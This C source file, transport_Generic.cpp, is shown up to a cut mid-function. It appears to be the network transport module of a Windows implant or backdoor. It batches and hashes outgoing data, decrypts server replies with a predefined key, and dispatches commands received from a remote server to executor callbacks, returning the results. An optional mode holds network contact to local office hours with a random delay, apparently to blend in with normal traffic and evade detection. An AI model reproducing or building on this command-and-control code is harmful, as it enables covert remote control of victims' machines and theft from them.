/*
	transport_Generic.cpp
	Generic routines used by all transport modules
*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"					// ?? possibly no need to be converted to API ??
#include "..\inc\CryptoStrings.h"		// +
#include "..\inc\HashedStrings.h"		// +
#include "..\inc\RandomGen.h"
#include "..\inc\MyStreams.h"
#include "..\inc\CryptRoutines.h"
#include "..\inc\DataCallbackManager.h"
#include "..\shared\config.h"
#include "..\shared\CommStructures.h"

#include "transport_Generic.h"
#include "transport_WinHTTP.h"
#include "transport_Pipes.h"

#include "NetworkConnectivity.h"

// global vars in single structure
TSG_WORK_STRUCTURE tsgenContext;



/*
	Compiled when PRESERVE_WORKHOURS_NETWORK_ACCESS is defined
	Pauses remote network access to be issued only in usual working hours
	according to local clock (9-00(+lag) - 19-00)
	This function will not return until expected local timeframe matched
*/
VOID tsgenWaitForWorkhours()
{
#ifdef PRESERVE_WORKHOURS_NETWORK_ACCESS
	SYSTEMTIME st = { 0 };	// GetLocalTime() result
	BOOL bWaitDone = FALSE;	// indicates if a wait is done
	RndClass rg = { 0 };
	DWORD dwMinutes;	// rnd minutes value to wait for before allowing communication

	// calc rnd lag time in minutes after 9
	rgNew(&rg);
	dwMinutes = rg.rgGetRnd(&rg, 5, 35);

	while (!bWaitDone) {

		// query local time
		GetLocalTime(&st);

		// check if allowed
		if ((st.wHour >= 9) && (st.wHour <= 19)) {

			// check for 9th hour
			if (st.wHour == 9) {

				// for 9th hour, check minutes value
				if (st.wMinute >= dwMinutes) { bWaitDone = TRUE; }

			} else { bWaitDone = TRUE; }

		} // 9-19 range

		// wait before go for 1 min
		DbgPrint("local time %u:%u allowed=%u", st.wHour, st.wMinute, bWaitDone);
		if (!bWaitDone) { 
			
#ifdef _DEBUG
			Sleep(3000);	// dbg 3s
#else
			Sleep(60000);	// release 1m
#endif	
		}	// !bWaitDone

	} // while !bWaitDone

#endif
}


// internal chunk manipulation routines

/*
	Checks if passed value refers to a valid handle, existing in internal chunks list
*/
BOOL _tsgenIsChunkHandleValid(CHUNK_HANDLE cHandle)
{
	BOOL bRes = FALSE;	// default result
	CHUNK_ITEM *pChunk;

	// basic pointer check
	if (IsBadWritePtr(cHandle, sizeof(CHUNK_ITEM))) { DbgPrint("ERR: handle ptr is not writable"); return bRes; }

	// is any items defined
	if (!tsgenContext.dwItemsCount) { DbgPrint("WARN: empty list"); return NULL; }

	// check if that value exists in list
	_tsgenEnterLock();

		// start enum, until list end or item found
		pChunk = tsgenContext.lHead.lcNext;

		while (pChunk) {

			// check if ptrs are the same
			if ((LPVOID)pChunk == (LPVOID)cHandle) { bRes = TRUE; break; }

			// move to next item
			pChunk = pChunk->lcNext;

		} // while pChunk

	_tsgenLeaveLock();

	return bRes;
}


// enters/leaves linked list access lock
VOID _tsgenEnterLock() { 
	
#ifdef _DEBUG

	while (!TryEnterCriticalSection(&tsgenContext.csListAccess)) {
	
		DbgPrint("NOTE: cs not entered, owning tid=%u", tsgenContext.csListAccess.OwningThread);

		Sleep(5000);

	}

#else

	EnterCriticalSection(&tsgenContext.csListAccess); 

#endif

}
VOID _tsgenLeaveLock() { LeaveCriticalSection(&tsgenContext.csListAccess); }


/*
	Seeks for a chunk with a specified volatile params pair and remove, if such chunk found
	NB: enters lock internally
	NB2: removes all matches chunks at once
	*//*
VOID _tsgenFindRemoveVolatileChunk(VOLATILE_CHUNK_ID vciType, VOLATILE_SOURCE vsSource)
{

	CHUNK_ITEM *pChunk;
	CHUNK_ITEM *pRemove = NULL;	// ptr to chunk selected for removal

	if (vciType == NON_VOLATILE) { DbgPrint("ERR: attempt to call for a non-volatile params"); return; }

	// check for anything in list
	if (!tsgenContext.dwItemsCount) { return; }

	_tsgenEnterLock();

	pChunk = tsgenContext.lHead.lcNext;

	while (pChunk) {

		// init
		pRemove = NULL;

		// check if it matches
		if ((pChunk->vciType == vciType) && (pChunk->vsSource == vsSource)) {

			DbgPrint("found volatile chunk %p for replacement, vciType=%u vsSource=%p", pChunk, vciType, vsSource);

			// save ptr to be removed
			pRemove = pChunk;

			// move to next chunk while it is still valid
			pChunk = pChunk->lcNext;

			// remove pRemove
			DbgPrint("removing chunk at %p", pRemove);
			_tsgenRemoveDisposeChunk(pRemove);

		} // types matches

		// move to next item, if needed
		if (!pRemove) { pChunk = pChunk->lcNext; }

	}	// while pChunk

	_tsgenLeaveLock();


}*/

// seeks for a chunk using passed volatile params and replaces it's data ptr and contents
// to a passed pNewData, lNewDataLen.
// NB: passed ptrs are assinged directly, so they should not be deallocated until chunk removal
// returns TRUE if founds matched chunk. Stops on first found. 
// Enters lock internally
BOOL _tsgenFindUpdateVolatileChunk(VOLATILE_CHUNK_ID vciType, VOLATILE_SOURCE vsSource, LPVOID pNewData, DWORD lNewDataLen)
{
	BOOL bRes = FALSE;	// func result
	CHUNK_ITEM *pChunk;

	if (vciType == NON_VOLATILE) { DbgPrint("ERR: attempt to call for a non-volatile params"); return bRes; }

	// check for anything in list
	if (!tsgenContext.dwItemsCount) { return bRes; }

	_tsgenEnterLock();

	pChunk = tsgenContext.lHead.lcNext;

	while (pChunk) {


		// check if it matches
		if ((pChunk->vciType == vciType) && (pChunk->vsSource == vsSource)) {

			//DbgPrint("found volatile chunk %p for replacement, vciType=%u vsSource=%u, oldlen=%u newlen=%u old_ptr=%p", pChunk, (DWORD)vciType, (DWORD)vsSource, pChunk->lOutLen, lNewDataLen, pChunk->pOut);

			// replace it's ptrs
			if (pChunk->pOut) { /*DbgPrint("deallocating %p", pChunk->pOut);*/ my_free(pChunk->pOut); }
			pChunk->pOut = pNewData;
			pChunk->lOutLen = lNewDataLen;

			//DbgPrint("now pOut=%p lOutLen=%u", pChunk->pOut, pChunk->lOutLen);

			bRes = TRUE;

			break;

		} // types matches

		// move to next item
		pChunk = pChunk->lcNext; 

	}	// while pChunk

	_tsgenLeaveLock();

	return bRes;
}


/*
	Adds a ready (encoded, enveloped, etc) data chunk to be uploaded to remote server.
	Saves to a local mem list AND to some persistent storage
	vciType defines if a chunk is of a volatile nature (for ex, heartbeat type), which is renewed very often and should
	be replaced with a new value, if already exists
	vsSource defines from where this particular chunk originated - a local machine or some remote, used to distinct volatile chunks
	from different machines
	Returns CHUNK_HANDLE to be used to query result of upload, or NULL in case of error
*/
CHUNK_HANDLE tsgenAddOutgoingChunk(LPVOID pData, DWORD dwDataLen, VOLATILE_CHUNK_ID vciType, VOLATILE_SOURCE vsSource)
{
	CHUNK_ITEM *pChunk = NULL;	// new chunk allocated
	BOOL bUpdatedExisting = FALSE;	// set to TRUE when while in lock, we found the same chunk by volatile params and updated it's contents

	// check input data
	if (!pData || !dwDataLen) { DbgPrint("ERR: invalid input params"); return NULL; }

	// check if we will not exceed max mem allocation
	if (tsgenContext.lAllItemsSize + dwDataLen > TS_MAX_ALLITEMS_SIZE) { DbgPrint("ERR: refuse due to maxmem limit"); return NULL; }

	// alloc a new chunk item
	pChunk = (CHUNK_ITEM *)my_alloc(sizeof(CHUNK_ITEM));

	// fill basic fields
	pChunk->cStatus = CS_NEW;
	pChunk->dwTicksCreated = GetTickCount();
	pChunk->lOutLen = dwDataLen;
	pChunk->pOut = my_alloc(dwDataLen);
	pChunk->vciType = vciType;
	pChunk->vsSource = vsSource;
	memcpy(pChunk->pOut, pData, dwDataLen);

	// enter list access
	_tsgenEnterLock();

		// try to remove possibly existing chunks according to vciType & vsSource
		if (vciType != NON_VOLATILE) {
			//_tsgenFindRemoveVolatileChunk(vciType, vsSource);

			// check/update existing chunk using volatile params
			bUpdatedExisting = _tsgenFindUpdateVolatileChunk(vciType, vsSource, pChunk->pOut, pChunk->lOutLen);

		}	// VOLATILE chunk detected

		// link item to list, if not updated existing item
		if (!bUpdatedExisting) {
			
			// really add new chunk, no update/replacement was done
			pChunk->lcNext = tsgenContext.lHead.lcNext;
			tsgenContext.lHead.lcNext = pChunk;
			tsgenContext.dwItemsCount++;
			tsgenContext.lAllItemsSize += dwDataLen;

			//DbgPrint("inserted new item of len %u, pchunk=%p pdata=%p new_count=%u new_allsize=%u", dwDataLen, pChunk, pChunk->pOut, tsgenContext.dwItemsCount, tsgenContext.lAllItemsSize);

		} else {

			// if updated chunk, just dealloc junk descriptor
			// Leave memory buffers as is, because it is assigned to existing chunk from now on
			my_free(pChunk);
			//DbgPrint("existing chunk was replaced");

		} // !bUpdatedExisting

		// update persistent storage, if persistent chunk was added
		if (vciType == NON_VOLATILE) {

			//DbgPrint("TO BE IMPLEMENTED: update persistent storage as a result of persistent chunk addition");
			// ...TO BE IMPLEMENTED...

		}	// persistent

	// leave list access
	_tsgenLeaveLock();

	return (CHUNK_HANDLE)pChunk;
}

/*
	Unlinks from chain, deallocates and decrements items count
	WARN: caller should already hold cs lock and verify if pChunk points to an existing valid chunk
*/
BOOL _tsgenRemoveDisposeChunk(CHUNK_ITEM *pChunk)
{
	BOOL bRes = FALSE;	// func result
	CHUNK_ITEM *pPrevChunk;	// previous chunk

	// find chunk, previous for pChunk, starting from head itself
	pPrevChunk = &tsgenContext.lHead;

	while (pPrevChunk) {

		// check if next pointed item is our target
		if ((LPVOID)pPrevChunk->lcNext == (LPVOID)pChunk) { break; }

		// move to next item
		pPrevChunk = pPrevChunk->lcNext;

	} // while pPrevChunk

	// check if found
	if (!pPrevChunk) { DbgPrint("ERR: prev chunk not found for %p", pChunk); return bRes; }

	// unlink pChunk from chain
	pPrevChunk->lcNext = pChunk->lcNext;

	// dec counter
	tsgenContext.dwItemsCount--;
	tsgenContext.lAllItemsSize -= pChunk->lOutLen;

	// deallocate buffers, if contained
	if (pChunk->pOut) { my_free(pChunk->pOut); }
	if (pChunk->pAnswer) { my_free(pChunk->pAnswer); }

	// free chunk structure itself
	my_free(pChunk);



	// all done
	bRes = TRUE;

	return bRes;
}


/*
	Queries status of a particular outgoing chunk previously added by tsgenAddOutgoingChunk().
	If status found to be CS_ANSWER_READY, pAnswerBuffer & dwAnswerBufferLen allocated and returned.
	In that case chunks is removed from list and all further queries for it will return CS_NONE as result
*/
CHUNK_STATUS tsgenQueryOutgoingChunkStatus(CHUNK_HANDLE cHandle, LPVOID *pAnswerBuffer, DWORD *dwAnswerBufferLen)
{
	CHUNK_STATUS csRes = CS_NONE;	// func result
	CHUNK_ITEM *pChunk = (CHUNK_ITEM *)cHandle;	// internal chunk ptr

	// check input
	if (!cHandle || !pAnswerBuffer || !dwAnswerBufferLen) { DbgPrint("ERR: invalid input params"); return CS_NONE; }
	if (!tsgenContext.dwItemsCount) { DbgPrint("WARN: empty list"); return CS_NONE; }

	// hold lock while work with list
	_tsgenEnterLock();

		if (_tsgenIsChunkHandleValid(cHandle)) {

			// item exists in list, may use pChunk
			csRes = pChunk->cStatus;

			// check for deallocation & answer ready
			if (csRes == CS_ANSWER_READY) {

				// save answer to caller
				*dwAnswerBufferLen = pChunk->lAnswerLen;
				if (!(*pAnswerBuffer = my_alloc(pChunk->lAnswerLen))) { DbgPrint("ERR: unable to alloc %u for answer", pChunk->lAnswerLen); _tsgenLeaveLock(); return CS_UPLOADING; }	// let caller query it once more
				memcpy(*pAnswerBuffer, pChunk->pAnswer, pChunk->lAnswerLen);

				// unlink and dealloc chunk
				_tsgenRemoveDisposeChunk(pChunk);

			} // CS_ANSWER_READY

		} else { DbgPrint("ERR: invalid handle passed"); }

	_tsgenLeaveLock();

	return csRes;
}

/*
	Used to update status of all chunks in pChunksListContext formed by tsgenFormOutgoingPackage
	Called when server communication thread from transport received some data from tsgenFormOutgoingPackage()
	and about to start it's upload to remote server
*/
BOOL tsgenUpdateChunksStatus(LPVOID pChunksListContext, CHUNK_STATUS csStatus)
{
	BOOL bRes = FALSE;
	LPVOID pPosAtPtrsList = pChunksListContext;
	CHUNK_ITEM *pChunk = (CHUNK_ITEM *)*(LPVOID *)pPosAtPtrsList;	// this is just a list of ptrs of sizeof(LPVOID), with NULL ptr at the end
	
	// check inputs
	if ((!pChunksListContext) || (!csStatus)) { DbgPrint("ERR: invalid input params"); return bRes; }
	if (!tsgenContext.dwItemsCount) { DbgPrint("WARN: empty list"); return CS_NONE; }

	// hold lock while work with list
	_tsgenEnterLock();

		while (pChunk) {

			if (_tsgenIsChunkHandleValid(pChunk)) {

				// may use pChunk to set status as requested
				pChunk->cStatus = csStatus;

			} else { DbgPrint("ERR: passed chunk %p is not a valid chunk", pChunk); }

			// move to next item in serialized buffer
			pPosAtPtrsList = (LPVOID)((SIZE_T)pPosAtPtrsList + sizeof(LPVOID));
			pChunk = (CHUNK_ITEM *)*(LPVOID *)pPosAtPtrsList;

		} // while pChunk

		bRes = TRUE;

	_tsgenLeaveLock();

	return bRes;
}

/*
	Performs a basic check of pEnvelope, returning 0 in case of check error, 
	or size of envelope + size of data if checks was ok

	dwSizeLimit receives a total size of server answer received, to be used as check for pEnvelope->dwDataLen values
*/
SIZE_T _tsgenBasicEnvelopeCheck(CHUNK_SERIALIZATION_ENVELOPE *pEnvelope, DWORD dwSizeLimit)
{
	SIZE_T lRes = 0;	// func result

	// check initial mem range
	if (IsBadWritePtr(pEnvelope, sizeof(CHUNK_SERIALIZATION_ENVELOPE))) { DbgPrint("ERR: pEnvelope ptr %p initial check failed", pEnvelope); return lRes; }

	// check if data len appended appears in the sane range
	if (pEnvelope->dwDataLen > dwSizeLimit) { DbgPrint("ERR: pEnvelope embedded data len check failed: found %u, max %u", pEnvelope->dwDataLen, dwSizeLimit); return lRes; }

	// check adjusted range - it is safe now to read contents
	lRes = sizeof(CHUNK_SERIALIZATION_ENVELOPE) + pEnvelope->dwDataLen;
	if (IsBadWritePtr(pEnvelope, lRes)) { DbgPrint("ERR: pEnvelope ptr %p extended check failed for size %u", pEnvelope, lRes); return lRes; }

	return lRes;
}

/*
	Checks and assigns result for a single chunk from a single envelope
	NB: pEnvelope and concat data should be checked for valid read ptr

	dwSizeLimit receives a total size of server answer received, to be used as check for pEnvelope->dwDataLen values
*/
BOOL _tsgenAssignSingleChunkResult(CHUNK_ITEM *pChunk, CHUNK_SERIALIZATION_ENVELOPE *pEnvelope, DWORD dwSizeLimit)
{
	BOOL bRes = FALSE;	// func result

	CHUNK_SERIALIZATION_ENVELOPE *pEnvelopeCopy = NULL;	// a copy of envelope with appended data, to wipe sha and calc it
	SIZE_T lEnvelopeAndDataLen = 0;	

	// hash buffer
	BYTE *pbHash = NULL;
	ULONG ulHashBufferLen = 1024;

	// check pEnvelope
	if (!(lEnvelopeAndDataLen = _tsgenBasicEnvelopeCheck(pEnvelope, dwSizeLimit))) { DbgPrint("ERR: pEnvelope check failed"); return bRes; }

	do { // not a loop

		// alloc and copy envelope + data
		if (!(pEnvelopeCopy = (CHUNK_SERIALIZATION_ENVELOPE *)my_alloc(lEnvelopeAndDataLen))) { DbgPrint("ERR: mem alloc failure"); break; }
		memcpy(pEnvelopeCopy, pEnvelope, lEnvelopeAndDataLen);

		// wipe sha hash from copy - hashing is done on a clear values
		memset(pEnvelopeCopy->bChunkHash, 0, 20);

		// calc sha hash of a copy envelope
		if (!(pbHash = (BYTE *)my_alloc(ulHashBufferLen))) { DbgPrint("ERR: mem alloc failure"); break; }
		if (!cryptCalcHashSHA(pEnvelopeCopy, lEnvelopeAndDataLen, pbHash, &ulHashBufferLen)) { DbgPrint("ERR: failed to calc hash"); break; }

		// compare hash with original structure
		if (memcmp(pbHash, &pEnvelope->bChunkHash, 20)) { DbgPrint("ERR: envelope check failed"); break; }

		//DbgPrint("envelope check OK, assigning %u b result to %p chunk", pEnvelopeCopy->dwDataLen, pChunk);

		// set done status to chunk
		pChunk->cStatus = CS_ANSWER_READY;
		pChunk->dwTicksAnswerReceived = GetTickCount();

		// assume done ok at this moment
		bRes = TRUE;

		// assign resulting buffers (copy), if exists in envelope
		if (pEnvelopeCopy->dwDataLen) {
		
			if (!(pChunk->pAnswer = my_alloc(pEnvelopeCopy->dwDataLen))) { DbgPrint("ERR: mem allocation error"); break; }
			pChunk->lAnswerLen = pEnvelopeCopy->dwDataLen;
			memcpy(pChunk->pAnswer, (LPVOID)((SIZE_T)pEnvelopeCopy + sizeof(CHUNK_SERIALIZATION_ENVELOPE)), pChunk->lAnswerLen);
		
		} else { /*DbgPrint("WARN: no answer data for chunk %p", pChunk);*/ }
		

	} while (FALSE);	// not a loop

	// free allocated buffers, if any
	if (pEnvelopeCopy) { my_free(pEnvelopeCopy); }
	if (pbHash) { my_free(pbHash); }

	return bRes;
}



/*
	Used to assign answers/status codes to all chunks pointed by pChunksListContext when buffer formed
	by tsgenFormOutgoingPackage() was uploaded to remote server and server answered us with pServerAnswerContext

	Data pointed by pServerAnswerContext is a concat of CHUNK_SERIALIZATION_ENVELOPE headers + appropriate data embedded.
*/
BOOL tsgenAssignChunksResults(LPVOID pChunksListContext, LPVOID pServerAnswerContextIn, DWORD dwServerAnswerContextLenIn)
{
	BOOL bRes = FALSE;	// func result
	LPVOID pPosAtPtrsList = pChunksListContext;	// ptr at pChunksListContext buffer
	CHUNK_ITEM *pChunk = (CHUNK_ITEM *)*(LPVOID *)pPosAtPtrsList;	// this is just a list of ptrs of sizeof(LPVOID), with NULL ptr at the end

	CHUNK_SERIALIZATION_ENVELOPE *pEnvelope;	// server returns buffer just like we prepare	

	LPVOID pSA = NULL;	// server answer, decrypted
	DWORD dwSALen = 0;	// len of decrypted server answer, may differ from dwServerAnswerContextLenIn

	// check input params
	if (!pChunksListContext || !pServerAnswerContextIn || !dwServerAnswerContextLenIn) { DbgPrint("ERR: invalid input params"); return bRes; }

	// decrypt server answer contents using some pre-defined key
	if (!cryptDecryptBuffer(pServerAnswerContextIn, dwServerAnswerContextLenIn, &pSA, &dwSALen)) { DbgPrint("ERR: failed to decrypt server answer"); return bRes; }

	// assign pointer
	pEnvelope = (CHUNK_SERIALIZATION_ENVELOPE *)pSA;

	// hold lock while work with list
	_tsgenEnterLock();

	while (pChunk) {

		//DbgPrint("processing pChunk at %p", pChunk);

		if (_tsgenIsChunkHandleValid(pChunk)) {

			// may use pChunk to set status as requested
			// NB: should check pEnvelope for valid mem range
			if (!(bRes = _tsgenAssignSingleChunkResult(pChunk, pEnvelope, dwSALen))) { DbgPrint("ERR: pEnvelope parse failed, exiting"); break; }

		} else { 
			DbgPrint("ERR: passed chunk %p is not a valid chunk", pChunk); 

			// basic check pEnvelope, due to no _tsgenAssignSingleChunkResult() called
			if (!(_tsgenBasicEnvelopeCheck(pEnvelope, dwSALen))) { DbgPrint("ERR: pEnvelope basic check failed, exiting"); break; }

		}

		// move to next item in serialized buffer
		pPosAtPtrsList = (LPVOID)((SIZE_T)pPosAtPtrsList + sizeof(LPVOID));
		pChunk = (CHUNK_ITEM *)*(LPVOID *)pPosAtPtrsList;

		// adjust ptr for envelope according to it's values (WARN: only if pEnvelope is still valid, checked by _tsgenAssignSingleChunkResult()
		pEnvelope = (CHUNK_SERIALIZATION_ENVELOPE *)((SIZE_T)pEnvelope + pEnvelope->dwDataLen + sizeof(CHUNK_SERIALIZATION_ENVELOPE));

	} // while pChunk


	_tsgenLeaveLock();

	// free res used
	if (pSA) { my_free(pSA); }

	return bRes;
}



// called from _tsgenParseAnswerForServerCommands() to prevent locking
// server link thread
DWORD WINAPI thrServerAnswerParser(LPVOID lpParameter)
{
	TSG_ANSWER_PARSE_PARAMS *app = (TSG_ANSWER_PARSE_PARAMS *)lpParameter; // should be disposed before exit
	DISPATCHER_CALLBACK_PARAMS dcp = { 0 };	// params structure to be sent to callback server
	CLIENTDISPATCHERFUNC pServingCallback = dcmGetServerCallback();

	SERVER_COMMAND *pServerCmd;	// assumed to be in server's answer
	CLIENT_COMMAND_RESULT *cer;	// exec result sent in case of no callback processed error

	LPVOID pCmdAnswer;	// ptr to resulting CLIENT_COMMAND_RESULT + payload, filled by module, or done internally
	DWORD dwCmdAnswerLen;	// sizeof(CLIENT_COMMAND_RESULT) + len of payload data, pointed by ^

	pServerCmd = (SERVER_COMMAND *)app->pData;	// moving ptr

	// check for valid pointer
	while ((SIZE_T)pServerCmd < (SIZE_T)app->pData + app->dwDataLen) {

		// check values to be in sane range
		if (IsBadWritePtr(pServerCmd, sizeof(SERVER_COMMAND))) { DbgPrint("ERR: pServerCmd(header) at %p invalid ptr for %u bytes", pServerCmd, sizeof(SERVER_COMMAND)); break;  }
		if (pServerCmd->dwPayloadSize > app->dwDataLen) { DbgPrint("ERR: pServerCmd(payload_size) of %u is outside of sane range %u", pServerCmd->dwPayloadSize, app->dwDataLen); break; }
		if (IsBadWritePtr(pServerCmd, pServerCmd->dwPayloadSize)) { DbgPrint("ERR: pServerCmd(full chunk) at %p invalid ptr for %u bytes", pServerCmd, pServerCmd->dwPayloadSize); break; }
		

		// fill structure
		memset(&dcp, 0, sizeof(DISPATCHER_CALLBACK_PARAMS));
		dcp.csType = ST_SERVER_COMMAND;
		dcp.pInBuffer = pServerCmd;
		dcp.lInBufferLen = sizeof(SERVER_COMMAND) + pServerCmd->dwPayloadSize;

		pCmdAnswer = NULL;	// to be sure, in case of error, no ptr double-free 

		// issue callback. It should fill and append CLIENT_COMMAND_RESULT to passed dcp structure
		if (!pServingCallback(&dcp)) {

			// no processor, form error report
			
			DbgPrint("WARN: no callback processed cmd type %u, uniq_cmd_id %u, preparing failure answer", pServerCmd->wCommandId, pServerCmd->dwUniqCmdId);

			cer = (CLIENT_COMMAND_RESULT *)my_alloc(sizeof(CLIENT_COMMAND_RESULT));
			cer->dwUniqCmdId = pServerCmd->dwUniqCmdId;
			cer->wGenericResult = CER_ERR_NO_EXECUTOR;

			// set ptrs
			pCmdAnswer = cer;
			dwCmdAnswerLen = sizeof(CLIENT_COMMAND_RESULT);

		} else {

			// processing callback supplied result
			//DbgPrint("callback processed cmd type %u, uniq_cmd_id %u, p_answer=%p answer_len=%u", pServerCmd->wCommandId, pServerCmd->dwUniqCmdId, dcp.pAnswer, dcp.lAnswerLen);

			pCmdAnswer = dcp.pAnswer;
			dwCmdAnswerLen = dcp.lAnswerLen;

		} // is cmd processed

		// send result
		if (pCmdAnswer) {
			if (!tsgenAddOutgoingChunk(pCmdAnswer, dwCmdAnswerLen, NON_VOLATILE, SOURCE_LOCAL)) { DbgPrint("ERR: failed to add outgoing result"); }

			// free ptrs
			my_free(pCmdAnswer); 
		}

		// adjust ptr to next position
		pServerCmd = (SERVER_COMMAND *)((SIZE_T)pServerCmd + sizeof(SERVER_COMMAND) + pServerCmd->dwPayloadSize);

	}

	// free input structure
	if (app->pData) { my_free(app->pData); }
	my_free(app);
	ExitThread(0);
}




/*
	Creates a thread to parse server's answer into SERVER_COMMAND and issue command callbacks via 
	CLIENTDISPATCHERFUNC pServingCallback = dcmGetServerCallback();
*/
VOID _tsgenParseAnswerForServerCommands(LPVOID pData, DWORD dwDataLen)
{
	TSG_ANSWER_PARSE_PARAMS *app = { 0 };	// structure to be passed to child thread
	DWORD dwThreadId;	// id of thread created

	app = (TSG_ANSWER_PARSE_PARAMS *)my_alloc(sizeof(TSG_ANSWER_PARSE_PARAMS));
	app->pData = my_alloc(dwDataLen);
	app->dwDataLen = dwDataLen;
	memcpy(app->pData, pData, dwDataLen);

	CloseHandle(CreateThread(NULL, 0, thrServerAnswerParser, app, 0, &dwThreadId));
	
}

/*
	Called on some periodic basic to find out and remove chunks, which have CS_ANSWER_READY status
	and not read by caller for too long. Max TTL for such chunks is defined at input param dwMaxTTLMins in minutes
	Typical recommended value is 60 minutes.
	Passing 0 as dwMaxTTLMins will remove all chunks with answers not still read by callers
	NB: lock is entered internally
*/
VOID _tsgenRemoveOutdatedChunks(DWORD dwMaxTTLMins)
{
	CHUNK_ITEM *pChunk;
	CHUNK_ITEM *pRemove = NULL;	// ptr to chunk selected for removal
	DWORD dwMinTicks = GetTickCount() - (dwMaxTTLMins * 60 * 1000);	// calc min value of ticks stamp for a chunk

	// check for anything in list
	if (!tsgenContext.dwItemsCount) { return; }

		_tsgenEnterLock();

		pChunk = tsgenContext.lHead.lcNext;

		while (pChunk) {

			// init
			pRemove = NULL;

			// check if for CS_ANSWER_READY
			if (pChunk->cStatus == CS_ANSWER_READY) {

				// dbg check
				if (!pChunk->dwTicksAnswerReceived) { DbgPrint("ERR: no answer stamp defined for chunk %p", pChunk); }

				// check ttl AND source
				if ( ((pChunk->dwTicksAnswerReceived) && (pChunk->dwTicksAnswerReceived < dwMinTicks)) || (pChunk->vsSource == SOURCE_LOCAL) ) {

#ifdef _DEBUG
					if (pChunk->vsSource != SOURCE_LOCAL) {
						DbgPrint("WARN: ttl for answer exceed at chunk %p, found %u s, min allowed %u s", pChunk, pChunk->dwTicksAnswerReceived / 1000, dwMinTicks / 1000);
					} // !SOURCE_LOCAL
#endif

					// if this is local chunk and have some answer -> broadcast it to all subscribers via DataCallbackManager
					if ((pChunk->vsSource == SOURCE_LOCAL) && (pChunk->lAnswerLen)) {

						//DbgPrint("chunk %p have answer, parsing for server cmds", pChunk);
						_tsgenParseAnswerForServerCommands(pChunk->pAnswer, pChunk->lAnswerLen);
						//DbgPrint("done parsing answer for server cmds from %p chunk", pChunk);

					} // !local & have data

					// save ptr to be removed
					pRemove = pChunk;

					// move to next chunk while it is still valid
					pChunk = pChunk->lcNext;

					// remove pRemove
					//DbgPrint("removing chunk at %p", pRemove);
					_tsgenRemoveDisposeChunk(pRemove);

				} // ttl / source check

			} // CS_ANSWER_READY

			// move to next item, if needed
			if (!pRemove) { pChunk = pChunk->lcNext; }

		}	// while pChunk

	_tsgenLeaveLock();
}

/*
	Wraps data pointed by chunk into a serialization buffer.
	NB: chunks may contain zero or other len, this routine should handle it correctly.
	The same is expected from server side.
	NB: it's caller responsibility to pass a valid pChunk ptr and hold cs while this function works
*/
BOOL _tsgenSerializeChunk(CHUNK_ITEM *pChunk, LPVOID *pSerializedResult, DWORD *dwSerializedLen)
{
	BOOL bRes = FALSE;	// initial func result
	CHUNK_SERIALIZATION_ENVELOPE *csEnvelope;	// ptr to envelope structure, at the start of initialized buffer
	RndClass rg = { 0 };	// random number generator
	BYTE bHash[20] = { 0 };	// buffer to hold binary hash of data

	// check inputs
	if (!pChunk || !pSerializedResult || !dwSerializedLen) { DbgPrint("ERR: invalid input params"); return bRes; }

	// alloc mem for resulting buffer
	*dwSerializedLen = sizeof(CHUNK_SERIALIZATION_ENVELOPE) + pChunk->lOutLen;
	if (!(*pSerializedResult = my_alloc(*dwSerializedLen))) { DbgPrint("ERR: failed to alloc %u b mem", *dwSerializedLen); return bRes; }

	// cast ptr
	csEnvelope = (CHUNK_SERIALIZATION_ENVELOPE *)*pSerializedResult;

	// prepare randoms
	rgNew(&rg);

	// fill envelope except hash
	csEnvelope->dwRandomValue = rg.rgGetRndDWORD(&rg);
	csEnvelope->dwDataLen = pChunk->lOutLen;

	// append data, if any
	if (pChunk->pOut && pChunk->lOutLen) {

		memcpy((LPVOID)((SIZE_T)*pSerializedResult + sizeof(CHUNK_SERIALIZATION_ENVELOPE)), pChunk->pOut, pChunk->lOutLen);

	} else { DbgPrint("WARN: empty chunk at %p", pChunk); }

	// calc hash into internal buffer
	ULONG ulHashLen = 20;
	cryptCalcHashSHA(*pSerializedResult, *dwSerializedLen, (PBYTE)&bHash, &ulHashLen);

	// copy hash into csEnvelope, actually to out allocated buffer
	memcpy(&csEnvelope->bChunkHash, &bHash, 20);

	// all done ok
	bRes = TRUE;

	return bRes;
}

/*
	Forms a package of as many chunks as fits into dwSuggestedMaxLen values
	Used to construct a big buffer to be uploaded to remote server at once.
	Allocates and stores pResultingBuffer & dwResultingBufferLen, caller should deallocate it 
	Also allocates and stores pChunksListContext with internal pts to chunks added to buffer.
	Server answers with a buffers package for all of parsed chunks at once.
*/
BOOL tsgenFormOutgoingPackage(DWORD dwSuggestedMaxLen, LPVOID *pResultingBuffer, DWORD *dwResultingBufferLen, LPVOID *pChunksListContext)
{
	BOOL bRes = FALSE;	// func result
	CHUNK_ITEM *pChunk;	// moving chunk ptr
	MY_STREAM msSerializedItems = { 0 };	// stream with serialized items
	MY_STREAM msChunkPtrs = { 0 };		// stream with chunk's ptrs, which included in ^ stream
	LPVOID pSerializedChunk;		// ptr to serialized chunk's representation
	DWORD dwSerializedChunkLen;	

	DWORD dwItemsCount = 0;	// dbg counter with amount of items serialized

	_tsgenEnterLock();
	
	do {	// not a loop

		// check if have any items
		if (!tsgenContext.dwItemsCount) { DbgPrint("empty list"); break; }

		// have items to proceed, enum searching for items with CS_NEW / CS_UPLOADING states
		// init streams
		if ((!msInitStream(&msSerializedItems)) || (!msInitStream(&msChunkPtrs))) { DbgPrint("ERR: failed to init streams"); break; }

		// enum all items available
		pChunk = tsgenContext.lHead.lcNext;

		while (pChunk) {

			// check item
			if ((pChunk->cStatus == CS_NEW) || (pChunk->cStatus == CS_UPLOADING)) {

				// save serialized chunk into stream
				if (_tsgenSerializeChunk(pChunk, &pSerializedChunk, &dwSerializedChunkLen)) {

					dwItemsCount++;

					// write to msSerializedItems
					msSerializedItems.msWriteStream(&msSerializedItems, pSerializedChunk, dwSerializedChunkLen);

					// free mem
					my_free(pSerializedChunk);

					// save chunk's ptr to msChunkPtrs
					// WARN: size is arch-specific. Server doesn't know anything about ptrs, it just returns answers in the same order as requests received
					msChunkPtrs.msWriteStream(&msChunkPtrs, &pChunk, sizeof(LPVOID));

					// modify chunk's state
					pChunk->cStatus = CS_UPLOADING;

					// check resulting size
					if (msSerializedItems.lDataLen >= dwSuggestedMaxLen) { DbgPrint("maxlen reached: requested up to %u, formed %u", dwSuggestedMaxLen, msSerializedItems.lDataLen); break; }

				}	// if serialized

			} // CS_NEW || CS_UPLOADING

			// move to next item
			pChunk = pChunk->lcNext;

		}	// while pChunk

	} while (FALSE);	// not a loop

	_tsgenLeaveLock();

	// check if anything was found
	if (msChunkPtrs.lDataLen) {

